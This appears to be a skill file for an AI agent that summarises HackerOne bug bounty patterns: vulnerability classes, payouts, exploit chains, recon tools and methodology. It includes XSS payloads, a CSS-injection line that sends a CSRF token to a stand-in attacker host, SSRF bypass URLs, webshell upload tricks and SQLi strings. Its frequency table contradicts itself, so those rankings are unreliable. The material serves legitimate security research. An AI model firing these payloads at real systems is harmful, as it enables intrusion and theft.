---
name: h1-bug-bounty-patterns
description: HackerOne bug bounty patterns distilled from 14,617+ disclosed reports — vulnerability classes ranked by frequency and payout, exploit chain architecture, recon methodology used by top earners, cross-category chains, and what actually pays. Battle-tested patterns, not theory.
triggers:
  - bug bounty
  - HackerOne
  - bounty pattern
  - what pays
  - vulnerability priority
  - bug bounty methodology
  - report pattern
  - XSS pattern
  - SSRF pattern
  - IDOR pattern
  - RCE pattern
  - SQLi pattern
  - account takeover pattern
  - file upload attack
  - exploit chain
  - bounty payout
  - recon methodology
---

# HackerOne Bug Bounty Patterns — What Actually Works

Consolidated from: HackerOne Top Writeups collections, HackerOne Bug Bounty Patterns analysis, and top researcher methodologies. 14,617+ disclosed reports analyzed. No theory — only proven patterns that extract bounties from real targets.

---

## 1. VULNERABILITY CLASSES RANKED BY FREQUENCY

Top 20 classes ranked by real-world frequency across HackerOne disclosures:

| Rank | Class | Approx Reports |
|------|-------|---------------|
| 1 | Information Disclosure | 209+ |
| 2 | Cross-Site Scripting (XSS) | 2,384 |
| 3 | Insecure Direct Object Reference (IDOR) | 253 |
| 4 | Server-Side Request Forgery (SSRF) | 311 |
| 5 | Account Takeover (ATO) | 234 |
| 6 | Privilege Escalation | 193 |
| 7 | SQL Injection (SQLi) | 307 |
| 8 | Remote Code Execution (RCE) | 200+ |
| 9 | File Upload | 154 |
| 10 | Cross-Site Request Forgery (CSRF) | Common |
| 11 | Business Logic / Race Conditions | Growing |
| 12 | Subdomain Takeover | Consistent |
| 13 | Dependency Confusion | Emerging |
| 14 | AI/LLM Vulnerabilities | 2025+ frontier |

### Key Stats (arXiv BOLA Study, 107 classified H1 reports):
- Action-Level Object BOLA: 41.7% — unauthorized state-changing actions
- Direct Object Reference BOLA: 36.9% — direct ID manipulation
- Tenant Isolation BOLA: 8.3% — cross-org boundary access
- Vertical Privilege Escalation: 11.9% — overlooked in most guidance
- 35.7% of IDOR reports rated High or Critical
- Sequential integers still appear in 36.9% of IDOR cases

---

## 2. WHAT PAYS — Top Bounties by Class

### Highest Single Bounties

| Bounty | Class | Company | Technique |
|--------|-------|---------|-----------|
| $35,000 | ATO | GitLab | Password Reset without user interaction |
| $33,510 | RCE | GitLab | DecompressedArchiveSizeValidator |
| $30,000 | RCE | PayPal | npm Dependency Confusion |
| $25,000 | SQLi | Valve | SQL Injection in report_xml.php |
| $20,160 | RCE | X (Twitter) | Pre-auth RCE on VPN |
| $20,000 | RCE | GitLab | ExifTool RCE / Kramdown RCE |
| $20,000 | XSS | PayPal | Stored XSS / Cache poisoning XSS |
| $20,000 | ATO | HackerOne | Session cookie leak |
| $17,576 | SSRF | Dropbox | Full Response SSRF via Google Drive |
| $15,000 | SQLi | Mail.ru | Time-based SQLi on city-mobil.ru |
| $12,500 | IDOR | HackerOne | Delete licenses/certifications |
| $12,000 | ATO | TikTok | Auth bypass in account recovery |
| $10,500 | IDOR | PayPal | Add secondary users |
| $10,000 | RCE | Uber | Flask Jinja2 Template Injection |
| $10,000 | ATO | Uber | Password reset token leaking |

### Payout Spectrum
- **$500 range**: Reflected XSS (no CSP bypass), standalone open redirect, low-impact info disclosure, missing security headers, rate limiting on non-critical endpoints
- **$5K-$10K range**: Stored XSS in admin panels, Blind XSS hitting internal dashboards, SSRF reaching cloud metadata, IDOR exposing PII/financial data, SQLi with data extraction
- **$20K-$35K+ range**: Pre-auth RCE, dependency confusion RCE, mass ATO, auth bypass to admin, critical info disclosure, multi-step exploit chains

### What Doesn't Pay
- U.S. Dept of Defense (VDP, no monetary rewards)
- Starbucks (mixed, some $0)
- MTN Group (many $0)
- Open redirect standalone
- Self-XSS without escalation

### Top-Paying Companies (by program averages)
1. GitLab: Multiple $12K-$35K (RCE, SSRF, ATO, XSS)
2. PayPal: $10K-$30K (XSS, IDOR, RCE)
3. Shopify: $500-$25K+ (XSS, SSRF, RCE, IDOR)
4. Valve: $2.5K-$25K (SQLi, XSS, RCE)
5. Uber: $1.5K-$10K (SQLi, XSS, ATO, SSRF)
6. HackerOne: $2.5K-$20K (ATO, SSRF, IDOR)
7. Mail.ru: $150-$15K (SQLi, XSS, SSRF, ATO)
8. Stripe: Up to $10.5K (ATO)
9. Dropbox: $500-$17.5K (SSRF, XSS)
10. TikTok: $200-$12K (XSS, ATO, IDOR, Upload)

---

## 3. TOP ATTACK CHAINS — The "God Chains"

### Pattern A: Info Disclosure → IDOR → Privilege Escalation → Critical
- Leak user UUIDs/IDs from one endpoint → use at another endpoint without auth check → access admin functions
- Example: Salesforce ContentDocument IDs leaked via Aura API → download endpoint → file access

### Pattern B: SSRF → Internal Service → RCE / Data Exfiltration
- Webhook URL → SSRF to metadata service → steal IAM creds → pivot to internal services
- SSRF → FastCGI → RCE (Mail.ru #1354335)
- SSRF → Internal Jolokia → RCE (Aiven #1547877, $5,000)
- SSRF → Exchange → ROOT access (Shopify #341876)

### Pattern C: XSS → Session Theft → Account Takeover
- Blind XSS hits admin panel → steal admin session → full platform compromise
- CSRF + XSS: force victim action + session hijack

### Pattern D: Cache Deception → Sensitive Data Leak → Account Takeover
- Append `.css`/`.js` to dynamic endpoint → cache stores private response → public access

### Pattern E: Subdomain Takeover → Cookie Scope Abuse → Session Hijack

### Pattern F: OAuth Dance Abuse → Account Linking Attack

### Pattern G: Dependency Confusion → Package Install → RCE

### Pattern H: Open Redirect → OAuth Token Theft → ATO

### Pattern I: XSS → CSRF Token Theft → State-Changing Operations

### Pattern J: File Upload → XSS → Session Theft → Account Takeover

---

## 4. XSS PATTERNS (2,384 reports)

### Core XSS Patterns
| Pattern | Example Targets |
|---------|----------------|
| Stored XSS via cache poisoning | PayPal signin page |
| Reflected XSS in OAuth flow | LY Corporation, Slack |
| Blind XSS on image upload | CS Money |
| DOM XSS in location hash | Slack |
| Stored XSS in Wiki/Markdown | GitLab |
| XSS via file upload filename | WordPress, Nextcloud |
| XSS via postMessage | Mail.ru, Shopify |
| XSS via Angular Template Injection | Mail.ru, New Relic |
| XSS via SVG upload | Shopify, Moneybird |
| XSS via CSS injection | Glassdoor |
| XSS via email rendering | Mail.ru |
| XSS via React element spoofing | Imgur |
| Second-order XSS | Various |
| Self-XSS escalation | Cloudflare |

### XSS Bypass Techniques
1. CSP bypass via JSONP endpoints, angular expressions, CDN whitelist
2. WAF bypass via Unicode escapes, case variations, double encoding, null bytes
3. HTML sanitizer bypass via Mutation XSS (mXSS), namespace confusion, foreignObject in SVG
4. DOMPurify bypass via prototype pollution, namespace confusion
5. Akamai/Cloudflare WAF bypass: SQLi+XSS combo, parameter pollution
6. Content-Type sniffing
7. Flash-based XSS (ZeroClipboard, swfupload, player.swf)
8. Cache poisoning for XSS
9. Open redirect to XSS via `javascript:` URL

### XSS Payload Patterns
```
- Standard: <script>alert(document.domain)</script>
- SVG: <svg/onload=alert(1)>
- IMG: <img src=x onerror=alert(1)>
- Angular: {{constructor.constructor('alert(1)')()}}
- postMessage: targetWindow.postMessage('{"key":"<img src=x onerror=...>"}', '*')
- CSS injection: input[name=csrf][value^="a"] { background: url(https://attacker/a) }
- Mutation XSS: <math><mtext><table><mglyph><style><!--</style><img src=x onerror=...>
- Dom clobbering: <a id=someConfig><a id=someConfig name=url href=javascript:alert(1)>
```

### Unique XSS Chains
1. Cache Poisoning → Stored XSS (PayPal #488147)
2. OAuth response_type switch → href leaking → XSS (Reddit #1567186)
3. XSS → CSRF bypass → RCE (Ubiquiti #289264)
4. Cookie Tossing + Anti-CSRF Token Prediction → Stored XSS (Cloudflare #3321406)
5. Open Redirect → Stored XSS → SSRF (Full Read) (Grafana CVE-2025-4123)
6. CSRF → XSS (U.S. Dept of Defense #1118521)
7. XSSJacking/PasteJacking → XSS (Zivver #893240)
8. Bypassing SOP with XSS → CSRF token theft (Mail.ru #1215053)

---

## 5. RCE PATTERNS (200+ reports)

### RCE Technique Taxonomy
| Category | Sub-techniques |
|----------|---------------|
| File Upload RCE | Webshell upload, PHP file upload, null byte extension bypass, .htaccess upload |
| Deserialization RCE | Java deserialization (WebLogic, Jenkins), Ruby Marshal.load, Python pickle, .NET BinaryFormatter, PHP unserialize |
| Injection to RCE | SQLi → xp_cmdshell, SSRF → FastCGI, Git flag injection |
| Dependency Confusion | npm misconfig → install internal libs from public registry, Ruby gems, Python pip |
| SSTI | Jinja2, Freemarker, Velocity, ERB, Twig |
| SSRF to RCE | SSRF → internal services (Jenkins, FastCGI, Gopher), Cloud metadata → credential theft |
| Buffer Overflow | Steam client, native apps |
| Prototype Pollution to RCE | Kibana, Node.js apps |
| ExifTool | CVE-2021-22204 — RCE when removing metadata (GitLab) |
| ImageTragick | ImageMagick delegate command injection |
| FFmpeg | HLS playlist processing → SSRF/LFI/RCE |

### Detailed RCE Chains
1. Buffer Overflow → RCE (Valve/Steam #470520)
2. Pre-auth RCE on VPN (Twitter/X #591295): $20,160
3. npm Dependency Confusion → RCE (PayPal #925585): $30,000
4. Git Flag Injection → Local File Overwrite → RCE (GitLab #658013): $12,000
5. SQL Injection → RCE via xp_cmdshell (QIWI #816254)
6. SSRF → FastCGI → RCE (Mail.ru #1354335)
7. Cookie Deserialization → RCE (GitLab)
8. Kramdown Options Injection → RCE (GitLab #1125425): $20,000
9. DecompressedArchiveSizeValidator → RCE (GitLab): Zip slip + symlink

### Common RCE Tools
- ysoserial (Java deserialization)
- PHPGGC (PHP gadget chains)
- ExifTool CVE-2021-22204
- ImageMagick delegates (ImageTragick)
- Git --output flag injection
- npm/pip/gem dependency confusion
- FFmpeg HLS + SSRF
- FastCGI direct connect

---

## 6. SQLi PATTERNS (307 reports)

### SQLi Types
| Type | Example |
|------|---------|
| Time-based blind | `sleep(5)`, `pg_sleep(5)`, `WAITFOR DELAY` |
| Boolean-based blind | `AND 1=1` vs `AND 1=2` |
| Error-based | Extract data from error messages |
| UNION-based | `UNION SELECT` data extraction |
| Stacked queries | Multiple statements in one call |
| Out-of-band (OOB) | DNS/HTTP exfiltration |

### SQLi Injection Points
- GET/POST parameters
- URL path: `/users/1' OR '1'='1`
- HTTP headers: User-Agent, Cookie, Referer
- GraphQL arguments
- JSON fields (JSONField KeyTransform in Django)
- ORM filter parameters (FilteredRelation, Q objects)
- CSV/import functionality
- File upload metadata (EXIF/Comment fields)

### SQLi to RCE Chains
1. SQLi → xp_cmdshell (MSSQL) — QIWI #816254
2. SQLi → UTL_HTTP (Oracle) — SSRF from within database
3. SQLi → LOAD_FILE/INTO OUTFILE (MySQL) — File read/write
4. SQLi → COPY ... FROM PROGRAM (PostgreSQL) — Command execution
5. SQLi → Insecure Deserialization → RCE (Krisp #1842674)
6. NoSQL Injection → RCE (Rocket.Chat #1130721) — Pre-auth blind NoSQLi

### WAF Bypass
- AWS WAF SQLi detection bypass
- Comment injection: `/**/`, `/*!*/`
- Case variation: `SeLeCt`, `UnIoN`
- Whitespace: tabs, newlines
- Encoding: URL double encoding, hex, char()
- Parameter pollution

### Database Targets
- MySQL/MariaDB (most common)
- PostgreSQL (GitLab, Django)
- MSSQL (corporate targets)
- Oracle (Informatica)
- ClickHouse (Mail.ru #1024773, $5,000)
- MongoDB (NoSQL injection)
- SQLite (local/embedded)

---

## 7. SSRF PATTERNS (311 reports)

### SSRF Impact Escalation
| Impact | Description |
|--------|-------------|
| AWS/Cloud metadata access | IMDSv1: `http://169.254.169.254/latest/meta-data/` |
| Internal service discovery | Port scanning, service enumeration |
| Cloud creds theft | IAM credentials from metadata → account takeover |
| RCE via internal services | FastCGI, Jenkins, Redis, Memcached, Gopher |
| LFI via SSRF | file://, gopher:// protocols |

### SSRF Entry Points
- Image/URL fetch: Upload from URL, avatar by URL, image proxy
- Webhooks: Custom webhook URLs, integration callbacks
- File import: Import from URL (Git, CSV, project import)
- PDF/Report generation: HTML-to-PDF, screenshot services
- OAuth flows: Jira integration, social login
- Video/FFmpeg processing: HLS playlist URLs, thumbnail generation
- URL preview/link unfurling: Slack, social media link previews
- IPFS/Git protocol: Unsanitized IPFS CIDs, git:// URLs
- DNS rebinding: DNS pin middleware bypass

### SSRF Bypass Techniques (11 methods)
1. DNS rebinding: TTL=0 DNS that resolves to internal IP on second query
2. Redirect bypass: 301/302 to internal IP (bypass URL allowlist)
3. IPv6 encoding: `http://[::ffff:169.254.169.254]/`
4. NAT64 prefix: `64:ff9b::1` → maps to IPv4
5. Decimal/octal IP: `http://2852039166/` = 169.254.169.254
6. URL parser confusion: `http://evil.com@127.0.0.1/`
7. DNS pinning bypass: `.xip.io`, trailing dot
8. Double brackets: Stripe Smokescreen bypass with `[[url]]`
9. CRLF injection: Inject headers via newlines in URL
10. Unicode homoglyphs: Cyrillic 'о' instead of Latin 'o'
11. Shortened URLs: bit.ly, tinyurl that redirect to internal

---

## 8. IDOR PATTERNS (253 reports)

### IDOR Parameter Patterns
| Parameter Type | Examples |
|---------------|----------|
| Numeric IDs | `user_id=123`, `order_id=456` |
| UUIDs | Predictable or leaked UUIDs |
| GraphQL object IDs | Base64 encoded IDs |
| Email addresses | Using victim's email as identifier |
| File/resource IDs | `attachment_id`, `document_id`, `photo_id` |
| Session/Token binding | Missing ownership check on token operations |

### IDOR Bypass Techniques
- HTTP method change: POST → PUT, GET → POST
- Array parameter wrapping: `user_id[]=victim_id`
- IDOR in GraphQL: Cross-tenant queries via mutations
- Race condition: TOCTOU in ownership checks
- UUID prediction: Time-based or sequential UUIDs
- Missing auth on internal APIs
- Cross-repository IDOR: GitHub #3560256

### IDOR-to-ATO Chains
1. IDOR edit email → Account Takeover (CrowdSignal #915114)
2. IDOR + Password reset → Mass ATO (U.S. DoD #685338)
3. IDOR + API token leak → ATO (Automattic #1695454)
4. IDOR → Account Takeover (Starbucks #876300)

---

## 9. ACCOUNT TAKEOVER PATTERNS (234 reports)

### ATO Technique Taxonomy
| Category | Sub-techniques |
|----------|---------------|
| Password Reset Abuse | Token leakage, weak token generation, no expiry, host header injection |
| Session Theft | XSS → cookie steal, HTTP request smuggling, cache deception |
| OAuth Misconfig | Insufficient redirect_uri validation, state parameter bypass, PKCE bypass |
| CSRF to ATO | CSRF on email change, password change, account linking |
| IDOR to ATO | Change victim's email, phone, or password |
| JWT Attacks | Weak signing, alg:none, key confusion, expired token reuse |
| SAML/OIDC Attacks | XML signature wrapping, assertion replay, RelayState injection |
| SSRF to ATO | Cloud metadata → credentials |
| Rate Limiting Bypass | SMS brute force, password brute force, 2FA bypass |
| Cache Poisoning | Cache deception, poisoned auth pages |

### Key ATO Chains
1. Password Reset without user interaction (GitLab #2293343): $35,000
2. Session cookie leak → ATO (HackerOne #745324): $20,000
3. HTTP Request Smuggling → Session theft → Mass ATO (Slack #737140)
4. OAuth callback bypass → ATO (X/Twitter #129873)
5. AWS Cognito misconfig → ATO (Flickr #1342088)
6. Open Redirect → XSS → ATO (Yelp #2010530)
7. CSRF + XSS → ATO (Mail.ru #1081148)
8. SSRF → Account takeover (Autodesk #3024673)
9. Spring Actuator → ATO (LY Corporation #862589, $5,000)
10. Sign with Apple flow bypass → ATO (Glassdoor #1639802)

### OAuth/SAML Specific Attacks
- Null byte %00 in state parameter (Logitech #1046630)
- response_type switch (Reddit #1567186)
- redirect_uri validation bypass (X/Twitter #129873)
- Missing PKCE validation (Grammarly #824931)
- RelayState URL validation bypass (GitLab #1923672)
- Insufficient OIDC state filtering (Tools for Humanity #2515808)

---

## 10. FILE UPLOAD PATTERNS (154 reports)

### Upload Attack Vectors
| Vector | Description |
|--------|-------------|
| Webshell upload | Upload .php/.jsp/.asp file directly |
| Extension bypass | .php5, .phtml, .php., .pHp, double extension (.php.jpg) |
| Null byte truncation | filename.php%00.jpg |
| Content-Type spoofing | Send PHP as image/jpeg |
| Image with embedded code | Polyglot files (valid image + PHP) |
| .htaccess upload | Upload .htaccess to enable PHP in upload dir |
| SVG-based attacks | SVG → XSS, SVG → XXE, SVG → SSRF |
| Archive/zip slip | Path traversal in extracted archives |
| TOCTOU race | Race between upload and validation |

### File Upload to RCE Chains
1. Logo upload → RCE (Semrush #403417)
2. Webshell via file upload (Starbucks #506646)
3. Admin default password → Image Upload Backdoor/Shell (Razer #699030)
4. TinyMCE upload bypass → RCE (8x8 #778629)
5. Null byte truncated extension → RCE (U.S. DoD #2054184)
6. File upload + SQLite JDBC driver → RCE (Aiven #1547877): $5,000

### File Upload to XSS Chains
1. Blind XSS on image upload (CS Money #1010466)
2. SVG upload → Stored XSS (Shopify, Nextcloud, Moneybird)
3. Unicode characters in filename → XSS (WordPress #179695)
4. HTML file upload → Stored XSS (Visma Public)
5. File upload with CSP bypass (Rocket.Chat #1380157)

### Upload Bypass Techniques
- Double extension: `shell.php.jpg`
- Null byte: `shell.php%00.jpg`
- MIME type spoofing
- Magic bytes: Add GIF89a/JFIF header to PHP file
- Case bypass: `.PhP`, `.pHp5`
- Windows ADS: `filename.php::$DATA`
- Apache override: `.htaccess` with `AddType application/x-httpd-php .jpg`
- config file: Upload `web.config` or `.user.ini`

---

## 11. CROSS-CATEGORY CHAINS (The 10 Most Valuable)

1. File Upload → XSS → Session Theft → Account Takeover
2. SSRF → Cloud Metadata → Credential Theft → Full Cloud Compromise
3. SQLi → Code Execution (xp_cmdshell) → Server Takeover
4. IDOR → Email Change → Password Reset → Account Takeover
5. Cache Poisoning → Stored XSS → Mass Victim Impact
6. Dependency Confusion → Package Install → RCE
7. SSRF → Internal Service (Jenkins/FastCGI) → RCE
8. XSS → CSRF Token Theft → State-Changing Operations
9. Open Redirect → OAuth Token Theft → Account Takeover
10. XSS → postMessage abuse → Cross-origin data theft

### Most Common Chained Pairings
| Primary | Secondary | Final Impact | Frequency |
|---------|-----------|--------------|-----------|
| SSRF | Cloud Metadata | Credential Theft | Very High |
| XSS | Session/Cookie Theft | ATO | Very High |
| IDOR | Email/Phone Change | ATO | High |
| SQLi | OOB/Stacked queries | RCE | Medium |
| File Upload | XSS via SVG/HTML | Session Theft | Medium |
| Open Redirect | OAuth Token Theft | ATO | Medium |
| CSRF | XSS (via injected) | ATO | Medium |

---

## 12. RECON METHODOLOGY (7-Phase Approach)

### Phase 1: Surface Mapping (Passive)
- Subdomain enumeration: `subfinder`, `amass` (passive), `crt.sh`, GitHub dorking
- ASN enumeration: `amass intel`, Shodan, Censys
- Reverse DNS: Discover hidden subdomains
- Cloud asset discovery: `cloud_enum`, `awsbucketdump`, `s3scanner`

### Phase 2: Live Host Probing
- `httpx`, `httprobe` → filter by status codes, content-length, technologies
- Focus on: non-200 responses with interesting content, dev/staging/admin, API gateways

### Phase 3: JavaScript Gold Mining
- Tools: `subjs`, `JSFinder`, `LinkFinder`, `gf` (pattern matching)
- What to grep: `apiKey`, `token`, `secret`, `password`, `/api/`, `/graphql`, `/internal/`, `/admin/`, hardcoded credentials, S3 bucket names, `postMessage` listeners

### Phase 4: URL Discovery & Parameter Mining
- Archive crawling: `gau` (getallurls), `waybackurls`, `ParamSpider`
- Live crawling: `katana`, `gospider`, `hakrawler`
- Parameter brute-force: `Arjun`, `ffuf` with param wordlists
- Focus on: Redirect parameters, file paths, IDs, callback URLs

### Phase 5: Content Discovery
- `feroxbuster`, `ffuf`, `dirsearch` (recursive)
- Wordlists: Seclists, Assetnote
- Look for: `.git/`, `.env`, `backup.zip`, `wp-config.php.bak`, `phpinfo.php`, Swagger/OpenAPI docs, GraphQL playground

### Phase 6: API Enumeration
- `kiterunner` for API endpoint brute-force
- Postman collections, Swagger/OpenAPI specs
- GraphQL: **InQL** Burp extension → auto-generate schema → fuzz every queryable field

### Phase 7: The "Two-Eye" Approach
1. Automated tools (nuclei, zap, custom scripts) — catch low-hanging fruit
2. Manual analysis — understand business logic, chain vulnerabilities

### Advanced Recon Tactics
- Monitor new features: Check changelogs, UI changes, network requests
- Compare interfaces: What's visible via UI vs API vs export/download?
- GitHub dorking for secrets: `GitDorker`, search for `filename:.npmrc _auth`
- Google dorking: `site:target.com ext:log`, `site:target.com inurl:admin`
- Test export/download/backup functions — often bypass UI-level access controls

---

## 13. COMMON MISCONFIGURATIONS

### Access Control (#1 Pattern)
- Missing object-level authorization on API endpoints
- GraphQL resolvers without ownership checks
- Admin endpoints discoverable but only "hidden" by UI
- `permissionRequired` typos in middleware (Rocket.Chat)
- Forgetting access control on export/download/archive functions

### Authentication
- Password reset tokens that never expire or are predictable
- JWT `alg: none` accepted or HS256 confusion with public key
- OAuth `state` parameter not validated
- Missing email verification on email change
- Rate limiting absent on login, password reset, 2FA, SMS endpoints

### Input Validation / Injection
- File upload accepting .php, .jsp, .svg without sanitization
- SVG upload without sanitization → stored XSS
- GraphQL allowing introspection in production
- XXE still possible in older XML parsers
- Template injection in user-controlled templates

### Infrastructure
- Cloud storage buckets with list/read permissions
- Subdomain DNS pointing to unclaimed cloud resources
- .git directory exposed on web root
- Debug mode enabled in production
- Internal services exposed on public IPs

### CORS & CSP
- `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
- CSP allowing `unsafe-inline` or `unsafe-eval`
- CSP allowing CDN domains where payloads can be hosted

### Caching
- Dynamic/sensitive pages returning `Cache-Control: public`
- CDN caching authenticated responses due to missing `Vary: Cookie`

---

## 14. TOOLS THAT SHIP BOUNTIES

### Core Stack
| Tool | Purpose |
|------|---------|
| Burp Suite Pro | Interception, repeater, intruder, collaborator |
| Caido | Modern alternative, HTTPQL for caching analysis |
| ffuf | Fast fuzzing (directories, parameters, vhosts) |
| nuclei | Template-based vulnerability scanning |
| subfinder + amass | Subdomain enumeration |
| httpx | Live host probing with tech detection |
| katana | Headless crawling, JS extraction |
| gau + waybackurls | Historical URL collection |
| sqlmap | SQL injection automation |

### Specialized Tools
| Tool | Use Case |
|------|----------|
| interactsh-client (self-hosted) | OOB/Blind SSRF detection |
| InQL (Burp extension) | GraphQL schema extraction and query fuzzing |
| Authz (Burp extension) | Automated IDOR testing with session tokens |
| Arjun | HTTP parameter discovery |
| kiterunner | API endpoint brute-force |
| cloud_enum | Cloud asset enumeration (S3, Azure, GCP) |
| GitDorker | Automated GitHub dorking |
| LinkFinder | Endpoint discovery from JavaScript |
| gf | Pattern matching (secrets, endpoints, parameters) |

---

## 15. THE HUNTER MINDSET

### What Separates $400K-$600K/yr Earners
1. **Depth over breadth**: Master one target. Understand its architecture, tech stack, business logic.
2. **System understanding > scanning**: 25% of NahamSec's earnings from SSRF because of deep understanding of URL parsing.
3. **New features = fresh attack surface**: The $10K HackerOne comments leak was found by monitoring a just-released "Export as .zip" feature.
4. **Challenge every assumption**: Is "admin only" actually enforced or just hidden in UI? Is "internal library" on the public registry?
5. **Impact > cleverness**: A simple IDOR that exposes all user PII pays more than a technically impressive XSS on a static page.
6. **Persistence beats talent**: Top earners submit consistently over years. Cleared $400K-600K in 2025.
7. **Self-host your infrastructure**: Public Burp Collaborator/interactsh servers are blocked. Self-host your OOB listener.
8. **Read disclosed reports**: The reddelexc/hackerone-reports repo has hundreds of categorized top reports.
9. **Two-eye principle**: Automated tools catch low fruit. Manual analysis finds critical chains.
10. **Report quality matters**: Clear executive summary + step-by-step reproduction + actual impact evidence = faster triage, higher payout.

---

## Sources
- ddosi.org/hackerone-report.html — Dashboard of 14,617 H1 reports
- bugboard.rsecloud.com/hackerone_reports — 10,000+ searchable disclosed reports
- hackerone.com/lp/top-ten-vulnerabilities — H1 Top 10 Vuln Types
- nahamsec.com — NahamSec's high-value vuln methodology
- arXiv 2605.25865v1 — BOLA empirical taxonomy
- GitHub: reddelexc/hackerone-reports — Tops by bug type
- GitHub: amrelsagaei/Bug-Bounty-Hunting-Methodology-2025
- HackerOne 2025 HPSR — $81M paid in bounties (13% YoY)
